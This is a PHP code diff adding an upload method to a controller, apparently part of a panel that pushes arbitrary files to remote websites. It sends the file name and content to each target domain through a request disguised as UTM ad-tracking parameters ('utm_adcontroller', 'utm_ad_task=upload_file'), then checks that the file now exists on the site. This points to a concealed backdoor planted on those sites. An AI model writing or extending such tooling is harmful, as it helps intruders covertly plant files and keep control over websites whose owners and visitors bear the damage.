@@ -84,5 +84,45 @@ class PlatformsController extends Controller {
         
     }
 
+    public function upload () {
+
+        if ($this->f3->exists('PARAMS.domain')) {
+
+            $this->f3->set('page_head','Загрузить файл');
+            $this->f3->set('view','sites/upload.html');
+
+        } elseif ($this->f3->exists('POST.domain')) {
+
+            $postdata = http_build_query(
+                array(
+                    'utm_adcontrol'       =>   '',
+                    'utm_ad_task'         => 'upload_file',
+                    'utm_ad_file_name'    => $this->f3->get('POST.filename'),
+                    'utm_ad_file_content' => $this->f3->get('POST.file_content')
+                )
+            );
+
+            $opts = array('http' =>
+                array(
+                    'method'  => 'POST',
+                    'header'  => 'Content-type: application/x-www-form-urlencoded',
+                    'content' => $postdata
+                )
+            );
+
+            $context  = stream_context_create($opts);
+
+            $res = file_get_contents('http://' . $this->f3->get('POST.domain') . '?utm_adcontroller', false, $context);
+
+            $status = @file_get_contents('http://' . $this->f3->get('POST.domain') . '/' . $this->f3->get('POST.filename'));
+
+            $status = $status ? 'success' : 'fail';
+
+            $this->f3->reroute('/upload/' . $this->f3->get('POST.domain') . '?' . $status);
+
+        }
+
+    }
+
 
 }
